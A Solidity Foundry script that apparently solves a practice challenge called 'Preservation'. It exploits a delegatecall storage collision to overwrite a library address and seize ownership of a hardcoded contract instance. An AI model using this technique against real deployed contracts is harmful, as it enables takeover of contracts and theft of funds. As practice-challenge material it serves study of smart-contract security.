// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "../lib/forge-std/src/Script.sol";

contract AttackPreservation {
    address public timeZone1Library; 
    address public timeZone2Library; 
    address public owner;

    function setTime(uint256 _something) public {
        owner = tx.origin;
    }
}

contract PreservationSolution is Script {
    Preservation preservationInstance = Preservation(payable(0xf762960b869607F4aAdffbC928486f0A08CE5D56));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackPreservation attacker = new AttackPreservation();
        preservationInstance.setFirstTime(uint256(uint160(address(attacker))));
        preservationInstance.setFirstTime(0);
        vm.stopBroadcast();
    }
}